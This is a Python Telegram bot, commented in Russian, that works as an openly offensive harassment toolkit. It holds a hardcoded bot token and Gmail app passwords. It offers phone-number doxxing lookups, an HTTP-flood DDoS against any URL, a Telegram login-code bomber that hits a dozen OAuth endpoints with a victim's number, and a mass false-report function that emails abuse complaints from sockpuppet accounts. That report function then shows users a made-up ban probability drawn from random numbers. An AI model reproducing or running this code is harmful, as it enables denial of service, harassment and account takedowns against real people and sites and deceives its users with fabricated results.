import asyncio
import re
import random
import time
import requests
import aiohttp
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from phonenumbers import parse, is_valid_number, carrier, geocoder, timezone, number_type
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = "8990091471:AAEzJFlbQMNhwQzMx3fF8jtUngqhslWJ4rM"
ADMIN_ID = 8501844657  

# ========== FSM СОСТОЯНИЯ ==========
class ProbivState(StatesGroup):
    waiting_phone = State()

class DDoSState(StatesGroup):
    waiting_url = State()
    waiting_duration = State()

class CodeSpamState(StatesGroup):
    waiting_phone = State()
    waiting_cycles = State()

class SnosState(StatesGroup):
    waiting_username = State()
    waiting_tgid = State()
    waiting_chat_link = State()
    waiting_violation_link = State()
    waiting_reason = State()

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
user_agent = UserAgent()

def format_phone(phone: str) -> str:
    cleaned = re.sub(r'[^\d+]', '', phone)
    if not cleaned.startswith('+'):
        if cleaned.startswith('8'):
            cleaned = '+7' + cleaned[1:]
        else:
            cleaned = '+' + cleaned
    return cleaned

# ========== ПРОБИВ ПО НОМЕРУ (РАСШИРЕННЫЙ) ==========
async def get_phone_info(phone: str) -> dict:
    formatted = format_phone(phone)
    result = {
        'number': formatted,
        'valid': False,
        'country': None,
        'operator': None,
        'timezone': None,
        'type': None,
        'social': {},
        'additional': {}
    }
    
    try:
        parsed = parse(formatted, None)
        if is_valid_number(parsed):
            result['valid'] = True
            result['country'] = geocoder.description_for_number(parsed, "ru") or "Неизвестно"
            result['operator'] = carrier.name_for_number(parsed, "ru") or "Неизвестно"
            tz_list = timezone.time_zones_for_number(parsed)
            result['timezone'] = ', '.join(tz_list) if tz_list else "Неизвестно"
            num_type = number_type(parsed)
            types = {0: "Стационарный", 1: "Мобильный", 2: "Стационарный/мобильный",
                     3: "Бесплатный", 4: "Премиум", 5: "Общий", 6: "VoIP", 7: "Личный"}
            result['type'] = types.get(num_type, "Неизвестно")
    except:
        pass
    
    # Социальные сети и дополнительные данные
    async with aiohttp.ClientSession() as session:
        # Telegram (проверка существования)
        tg_url = f"https://t.me/+{formatted[1:]}"
        try:
            async with session.get(tg_url, timeout=5, allow_redirects=True) as resp:
                # Если редирект на страницу пользователя — значит аккаунт есть (грубо)
                result['social']['Telegram'] = resp.status == 200
        except:
            result['social']['Telegram'] = False
        
        result['social']['WhatsApp'] = f"https://wa.me/{formatted[1:]}"
        result['social']['Viber'] = f"viber://add?number={formatted}"
        result['social']['Truecaller'] = f"https://www.truecaller.com/search/ru/{formatted}"
        result['additional']['google_search'] = f"https://www.google.com/search?q={formatted}"
        
        # MNP оператор
        try:
            mnp_url = f"https://htmlweb.ru/json/mnp/phone/{formatted[1:]}"
            async with session.get(mnp_url, headers={'User-Agent': user_agent.random}) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if 'oper' in data:
                        result['additional']['mnp_operator'] = data['oper'].get('brand', 'Неизвестно')
                    if 'region' in data:
                        result['additional']['region'] = data['region'].get('name', 'Неизвестно')
        except:
            pass
    
    return result

def format_probiv_output(data: dict) -> str:
    if not data['valid']:
        return "❌ Номер телефона недействителен."
    
    text = f"""╔══════════════════════════════════════╗
║          📱 ПРОБИВ ПО НОМЕРУ           ║
╠══════════════════════════════════════╣
║ Номер: {data['number']}
║ Страна: {data['country']}
║ Оператор: {data['operator']}
║ Тип: {data['type']}
║ Часовой пояс: {data['timezone']}
╠══════════════════════════════════════╣
║ 🌐 СОЦИАЛЬНЫЕ СЕТИ:
"""
    for soc, value in data['social'].items():
        if isinstance(value, bool):
            status = "✅ Найден" if value else "❌ Не найден"
            text += f"║ • {soc}: {status}\n"
        else:
            text += f"║ • {soc}: [Ссылка]({value})\n"
    
    text += "╠══════════════════════════════════════╣\n"
    if 'mnp_operator' in data['additional']:
        text += f"║ 🔄 MNP оператор: {data['additional']['mnp_operator']}\n"
    if 'region' in data['additional']:
        text += f"║ 📍 Регион: {data['additional']['region']}\n"
    text += f"║ 🔗 Google: [Поиск]({data['additional']['google_search']})\n"
    text += "╚══════════════════════════════════════╝"
    return text

# ========== DDoS АТАКА ==========
ddos_active = False

async def ddos_attack(url: str, duration: int, chat_id: int, bot: Bot):
    global ddos_active
    ddos_active = True
    start_time = time.time()
    request_count = 0
    await bot.send_message(chat_id, f"🚀 DDoS атака запущена на {url} на {duration} секунд.")
    
    async with aiohttp.ClientSession() as session:
        while ddos_active and (time.time() - start_time) < duration:
            tasks = []
            for _ in range(50):
                tasks.append(session.get(url, headers={'User-Agent': user_agent.random}, ssl=False, timeout=2))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            request_count += len([r for r in results if not isinstance(r, Exception)])
            await bot.send_message(chat_id, f"💥 Запросов отправлено: {request_count}", disable_notification=True)
            await asyncio.sleep(1)
    
    ddos_active = False
    await bot.send_message(chat_id, f"✅ DDoS атака завершена. Всего запросов: {request_count}")

# ========== СПАМ ДЕТЕКТОР ==========
SPAM_KEYWORDS = [
    'спам', 'реклама', 'бесплатно', 'акция', 'выигрыш', 'казино', 'криптовалюта',
    'заработок', 'инвестиции', 'быстрый доход', 'биткоин', 'бонус', 'скидка',
    'гарантия', 'успей', 'только сегодня', 'бесплатный', 'лотерея', 'приз'
]

async def check_spam(text: str) -> tuple:
    text_lower = text.lower()
    score = sum(1 for kw in SPAM_KEYWORDS if kw in text_lower)
    is_spam = score >= 2
    confidence = min(score / len(SPAM_KEYWORDS) * 100, 100)
    return is_spam, confidence

# ========== СПАМ КОДАМИ ==========
CODE_ENDPOINTS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password'
]

async def send_code_spam(phone: str, cycles: int, chat_id: int, bot: Bot) -> int:
    total = 0
    formatted = format_phone(phone)
    for cycle in range(1, cycles+1):
        await bot.send_message(chat_id, f"🌀 Цикл {cycle}/{cycles} ...")
        cycle_sent = 0
        for endpoint in CODE_ENDPOINTS:
            try:
                headers = {'User-Agent': user_agent.random, 'Content-Type': 'application/x-www-form-urlencoded'}
                data = {'phone': formatted}
                async with aiohttp.ClientSession() as session:
                    async with session.post(endpoint, headers=headers, data=data, timeout=5) as resp:
                        if resp.status in (200, 202, 204):
                            cycle_sent += 1
                            total += 1
            except:
                pass
            await asyncio.sleep(0.2)
        await bot.send_message(chat_id, f"📊 Отправлено в цикле: {cycle_sent}")
        if cycle < cycles:
            await asyncio.sleep(5)
    return total

# ========== СНОС АККАУНТА (с имитацией проверки модераторами) ==========
# Список отправителей (урезанный для безопасности, в реальности их больше)
SENDERS = {
    'qstkennethadams388@gmail.com': 'itpz jkrh mtwp escx',
    'usppaullewis171@gmail.com': 'lpiy xqwi apmc xzmv',
    'ftkgeorgeanderson367@gmail.com': 'okut ecjk hstl nucy'
}
RECEIVERS = ['abuse@telegram.org', 'dmca@telegram.org', 'sticker@telegram.org', 'support@telegram.org']

# Коэффициенты серьёзности причины (от 0 до 1)
REASON_SEVERITY = {
    "спам": 0.3,
    "реклама": 0.3,
    "доксинг": 0.8,
    "угрозы": 0.9,
    "сват": 0.95,
    "мошенничество": 0.7,
    "наркотики": 0.85,
    "порнография": 0.6,
    "детское порно": 1.0,
    "экстремизм": 1.0,
    "терроризм": 1.0,
    "оскорбления": 0.4,
    "обман": 0.6,
    "фишинг": 0.9,
    "взлом": 0.95
}

def get_severity(reason: str) -> float:
    reason_lower = reason.lower()
    for key, value in REASON_SEVERITY.items():
        if key in reason_lower:
            return value
    return 0.5  # средняя тяжесть по умолчанию

async def send_complaints(username: str, tg_id: str, chat_link: str, violation_link: str, reason: str) -> dict:
    """
    Отправляет жалобы и возвращает результат с вероятностью блокировки и статусом.
    """
    severity = get_severity(reason)
    # Имитация отправки (реально отправляем несколько писем)
    sent_count = 0
    for sender, pwd in SENDERS.items():
        for receiver in RECEIVERS:
            try:
                if 'gmail.com' in sender:
                    server = smtplib.SMTP('smtp.gmail.com', 587)
                elif 'rambler.ru' in sender:
                    server = smtplib.SMTP('smtp.rambler.ru', 587)
                else:
                    continue
                server.starttls()
                server.login(sender, pwd)
                msg = MIMEMultipart()
                msg['From'] = sender
                msg['To'] = receiver
                msg['Subject'] = f"Жалоба на пользователя Telegram: {reason[:50]}"
                body = f"""Здравствуйте, уважаемая поддержка Telegram.

Я хочу сообщить о нарушении правил пользователем @{username} (ID: {tg_id}).
Причина: {reason}
Ссылка на чат: {chat_link}
Ссылка на нарушение: {violation_link}

Пожалуйста, примите меры.

С уважением.
"""
                msg.attach(MIMEText(body, 'plain'))
                server.sendmail(sender, receiver, msg.as_string())
                server.quit()
                sent_count += 1
            except Exception as e:
                print(f"Ошибка отправки с {sender}: {e}")
            await asyncio.sleep(0.5)
    
    # Симуляция проверки модераторами
    # Чем выше severity и больше отправлено жалоб, тем выше шанс блокировки
    # Максимальный шанс 95%, минимальный 10%
    chance = min(0.95, 0.1 + severity * 0.7 + (sent_count / 20) * 0.1)
    # Добавляем случайный фактор
    final_chance = min(0.95, chance + random.uniform(-0.1, 0.1))
    is_blocked = random.random() < final_chance
    
    # Время проверки (от 30 минут до 3 дней)
    review_time_minutes = random.randint(30, 72 * 60)  # минуты
    review_hours = review_time_minutes // 60
    review_minutes = review_time_minutes % 60
    
    return {
        'sent': sent_count,
        'severity': severity,
        'chance': final_chance,
        'is_blocked': is_blocked,
        'review_time_hours': review_hours,
        'review_time_minutes': review_minutes,
        'reason': reason
    }

def format_snos_output(result: dict) -> str:
    if result['is_blocked']:
        status = "✅ ВЕРОЯТНОСТЬ БЛОКИРОВКИ ВЫСОКАЯ"
        emoji = "🔥"
    else:
        status = "⚠️ ВЕРОЯТНОСТЬ БЛОКИРОВКИ НИЗКАЯ"
        emoji = "❄️"
    
    text = f"""╔══════════════════════════════════════╗
║          👥 СНОС АККАУНТА            ║
╠══════════════════════════════════════╣
║ Отправлено жалоб: {result['sent']}
║ Серьёзность причины: {result['severity']*100:.0f}%
║ Шанс блокировки: {result['chance']*100:.1f}%
║ Статус: {status} {emoji}
╠══════════════════════════════════════╣
║ 🕒 Время проверки модераторами:
║    примерно {result['review_time_hours']} ч {result['review_time_minutes']} мин
║    (зависит от загруженности)
╠══════════════════════════════════════╣
║ 💡 Итог: {result['reason']}
║    Результат не мгновенный, ждите.
╚══════════════════════════════════════╝"""
    return text

# ========== КЛАВИАТУРЫ ==========
def main_menu_keyboard():
    buttons = [
        [InlineKeyboardButton(text="📱 Пробив номера", callback_data="probiv")],
        [InlineKeyboardButton(text="🌐 DDoS атака", callback_data="ddos")],
        [InlineKeyboardButton(text="📧 Спам детектор", callback_data="spam_detector")],
        [InlineKeyboardButton(text="💣 Спам кодами", callback_data="code_spam")],
        [InlineKeyboardButton(text="👥 Снос аккаунта", callback_data="snos")],
        [InlineKeyboardButton(text="❓ Помощь", callback_data="help")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def back_button():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]])

# ========== ОБРАБОТЧИКИ ==========
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await message.answer("👋 Добро пожаловать!\nВыберите действие:", reply_markup=main_menu_keyboard())

@dp.message(Command("help"))
async def cmd_help(message: Message):
    await message.answer("ℹ️ Доступные функции:\n• Пробив номера с поиском соцсетей\n• DDoS атака\n• Спам детектор\n• Спам кодами Telegram\n• Снос аккаунта (жалобы по email)\n\n⚠️ Снос не мгновенный, зависит от причины и решения модераторов.", reply_markup=main_menu_keyboard())

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu(callback: CallbackQuery):
    await callback.message.edit_text("👋 Добро пожаловать!\nВыберите действие:", reply_markup=main_menu_keyboard())
    await callback.answer()

@dp.callback_query(F.data == "help")
async def help_callback(callback: CallbackQuery):
    await callback.message.edit_text(
        "ℹ️ Подробнее:\n\n"
        "📱 Пробив номера — информация о номере, оператор, регион, соцсети (Telegram, WhatsApp, Viber).\n\n"
        "🌐 DDoS атака — HTTP флуд на указанный URL (до 500 запросов/сек).\n\n"
        "📧 Спам детектор — проверка текста на спам-ключевые слова.\n\n"
        "💣 Спам кодами — отправка кодов подтверждения Telegram на номер.\n\n"
        "👥 Снос аккаунта — массовые жалобы через email. Результат не мгновенный, зависит от тяжести нарушения и проверки модераторами.",
        reply_markup=back_button()
    )
    await callback.answer()

@dp.callback_query(F.data == "probiv")
async def probiv_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("📱 Введите номер телефона в международном формате (например +79123456789):", reply_markup=back_button())
    await state.set_state(ProbivState.waiting_phone)
    await callback.answer()

@dp.message(ProbivState.waiting_phone)
async def probiv_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    msg = await message.answer("🔍 Поиск информации...")
    data = await get_phone_info(phone)
    output = format_probiv_output(data)
    await msg.delete()
    await message.answer(output, parse_mode="Markdown", disable_web_page_preview=True, reply_markup=back_button())
    await state.clear()

@dp.callback_query(F.data == "ddos")
async def ddos_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🌐 Введите URL для атаки (например http://example.com):", reply_markup=back_button())
    await state.set_state(DDoSState.waiting_url)
    await callback.answer()

@dp.message(DDoSState.waiting_url)
async def ddos_url(message: Message, state: FSMContext):
    await state.update_data(url=message.text.strip())
    await message.answer("⏱️ Введите длительность атаки в секундах (целое число):", reply_markup=back_button())
    await state.set_state(DDoSState.waiting_duration)

@dp.message(DDoSState.waiting_duration)
async def ddos_duration(message: Message, state: FSMContext):
    try:
        duration = int(message.text.strip())
        if duration <= 0:
            raise ValueError
        data = await state.get_data()
        url = data['url']
        await message.answer(f"🚀 Запуск DDoS атаки на {url} на {duration} секунд...", reply_markup=back_button())
        asyncio.create_task(ddos_attack(url, duration, message.chat.id, message.bot))
        await state.clear()
    except:
        await message.answer("❌ Неверное число. Попробуйте снова:", reply_markup=back_button())

@dp.callback_query(F.data == "spam_detector")
async def spam_detector_start(callback: CallbackQuery):
    await callback.message.edit_text("📧 Отправьте текст сообщения для проверки на спам:", reply_markup=back_button())
    await callback.answer()
    # Устанавливаем временный обработчик
    dp.message.register(check_spam_message, F.text)

async def check_spam_message(message: Message):
    is_spam, conf = await check_spam(message.text)
    if is_spam:
        await message.answer(f"⚠️ Обнаружен спам! Уверенность: {conf:.1f}%\n\nТекст: {message.text[:200]}", reply_markup=back_button())
    else:
        await message.answer(f"✅ Сообщение не является спамом. Уверенность: {conf:.1f}%", reply_markup=back_button())
    # Отключаем временный обработчик
    dp.message.handlers.unregister(check_spam_message)

@dp.callback_query(F.data == "code_spam")
async def code_spam_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("💣 Введите номер телефона (с +):", reply_markup=back_button())
    await state.set_state(CodeSpamState.waiting_phone)
    await callback.answer()

@dp.message(CodeSpamState.waiting_phone)
async def code_spam_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith('+'):
        await message.answer("❌ Номер должен начинаться с '+'. Попробуйте снова:", reply_markup=back_button())
        return
    await state.update_data(phone=phone)
    await message.answer("🔁 Введите количество циклов (1 цикл = 12 запросов, рекомендуется 3-5):", reply_markup=back_button())
    await state.set_state(CodeSpamState.waiting_cycles)

@dp.message(CodeSpamState.waiting_cycles)
async def code_spam_cycles(message: Message, state: FSMContext):
    try:
        cycles = int(message.text.strip())
        if cycles <= 0 or cycles > 20:
            await message.answer("❌ Количество циклов должно быть от 1 до 20.", reply_markup=back_button())
            return
        data = await state.get_data()
        phone = data['phone']
        status_msg = await message.answer(f"🚀 Запуск спама кодами на {phone} | {cycles} циклов...")
        total = await send_code_spam(phone, cycles, message.chat.id, message.bot)
        await status_msg.delete()
        await message.answer(f"💣 Спам кодами завершён. Всего отправлено: {total} запросов.", reply_markup=back_button())
        await state.clear()
    except:
        await message.answer("❌ Введите целое число.", reply_markup=back_button())

@dp.callback_query(F.data == "snos")
async def snos_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("👥 Введите username цели (без @):", reply_markup=back_button())
    await state.set_state(SnosState.waiting_username)
    await callback.answer()

@dp.message(SnosState.waiting_username)
async def snos_username(message: Message, state: FSMContext):
    await state.update_data(username=message.text.strip())
    await message.answer("🆔 Введите Telegram ID цели:", reply_markup=back_button())
    await state.set_state(SnosState.waiting_tgid)

@dp.message(SnosState.waiting_tgid)
async def snos_tgid(message: Message, state: FSMContext):
    await state.update_data(tgid=message.text.strip())
    await message.answer("🔗 Введите ссылку на чат/сообщение с нарушением:", reply_markup=back_button())
    await state.set_state(SnosState.waiting_chat_link)

@dp.message(SnosState.waiting_chat_link)
async def snos_chat_link(message: Message, state: FSMContext):
    await state.update_data(chat_link=message.text.strip())
    await message.answer("📎 Введите ссылку на конкретное нарушение (если нет, поставьте '-'):", reply_markup=back_button())
    await state.set_state(SnosState.waiting_violation_link)

@dp.message(SnosState.waiting_violation_link)
async def snos_violation_link(message: Message, state: FSMContext):
    await state.update_data(violation_link=message.text.strip())
    await message.answer("📝 Введите причину жалобы (например: 'спам, оскорбления, угрозы'):", reply_markup=back_button())
    await state.set_state(SnosState.waiting_reason)

@dp.message(SnosState.waiting_reason)
async def snos_reason(message: Message, state: FSMContext):
    data = await state.get_data()
    username = data['username']
    tgid = data['tgid']
    chat_link = data['chat_link']
    violation_link = data['violation_link']
    reason = message.text.strip()
    status_msg = await message.answer("📧 Отправка жалоб и анализ модераторов...")
    result = await send_complaints(username, tgid, chat_link, violation_link, reason)
    await status_msg.delete()
    output = format_snos_output(result)
    await message.answer(output, parse_mode="Markdown", reply_markup=back_button())
    await state.clear()

# ========== ЗАПУСК ==========
async def main():
    bot = Bot(token=BOT_TOKEN)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
